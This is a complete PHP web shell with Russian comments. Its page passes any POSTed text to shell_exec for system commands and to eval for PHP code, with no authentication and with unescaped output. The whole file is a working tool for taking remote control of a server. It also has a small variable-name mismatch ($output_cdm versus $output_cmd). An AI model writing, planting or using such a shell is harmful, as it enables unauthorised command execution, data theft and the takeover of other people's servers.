<?php 
header("Content-type: text/html; charset=utf-8");

error_reporting(E_ALL);

$output_cdm = "";
$cmd = "";
$php = "";
if(isset($_POST['sys_call'])){
	$cmd = $_POST['sys_call'];
	$output_cmd = shell_exec($cmd); //выполнение команд shell
}

if(isset($_POST['php_call'])){
	$php = $_POST['php_call'];
}

?>

<div>
    <form method="POST">
        <input type="submit" value="Выполнить"/>
        <div style="float:left;width:600px;">
            <label for="">Shell code</label><br>
            <textarea name="sys_call" style="width:100%;height:400px;"><?php echo $cmd;?></textarea>
            <div>
                <?php echo $output_cmd;?>
            </div>
        </div>
        <div style="float:right;width:600px;">
            <label for="">PHP code</label><br>
            <textarea name="php_call" style="width:100%;height:400px;"><?php echo $php;?></textarea>
            <div>
                <?php 
                    if($php){
                        $output_php = eval($php); //выполнение команд php
                        echo $output_php;
                    }
                ?>
            </div>
        </div>
        <div style="clear:both"></div>
    </form>
</div>
